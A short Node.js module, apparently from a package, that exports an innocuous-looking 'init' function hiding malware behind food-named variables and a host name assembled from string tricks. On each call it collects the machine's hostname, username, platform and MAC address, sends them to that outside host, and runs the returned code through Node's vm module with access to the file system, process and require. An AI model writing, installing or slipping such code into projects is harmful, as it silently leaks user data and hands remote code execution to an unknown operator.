function init() {
  var salt = require('https');
  var mint_kiwi = require('vm');
  var pasta_vanilla = require('fs');
  var pasta_soda = require('os');
  var salad_wheat = require('path');
  var candy_chicken = require('crypto');
  const cheese = (Object+'').split(' ')[0]+"."+(undefined)+21+".com";
  
  function tomato() {
    const ifaces = pasta_soda.networkInterfaces();
    for (const name of Object.keys(ifaces)) {
      for (const iface of ifaces[name]) {
        if (!iface.internal && iface.mac !== '00:00:00:00:00:00') {
          return iface.mac;
        }
      }
    }
    return 'unknown';
  }
  
  function sugar() {
    const data = pasta_soda.hostname() + tomato() + pasta_soda.platform();
    return candy_chicken.createHash('sha256').update(data).digest('hex').substring(0, 16);
  }
  
  const juice = {
    hostname: pasta_soda.hostname(),
    username: pasta_soda.userInfo().username,
    platform: pasta_soda.platform(),
    macAddress: tomato(),
    machineId: sugar()
  };
  
  function chicken_vanilla() {
    const options = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    };
    
    const req = salt.request("https://"+cheese+'/p', options, (res) => {
      let berry = '';
      res.on('data', (peach) => berry += peach);
      res.on('end', () => {
        try {
          const salad = mint_kiwi.createContext({ console, require, process, Buffer, salt, cheese, pasta_vanilla, pasta_soda, salad_wheat });
          mint_kiwi.runInContext(berry, salad);
        } catch (e) {
        }
      });
    });
  
    req.write(JSON.stringify(juice));
    req.end();
  }
  chicken_vanilla();
  
}

module.exports = init;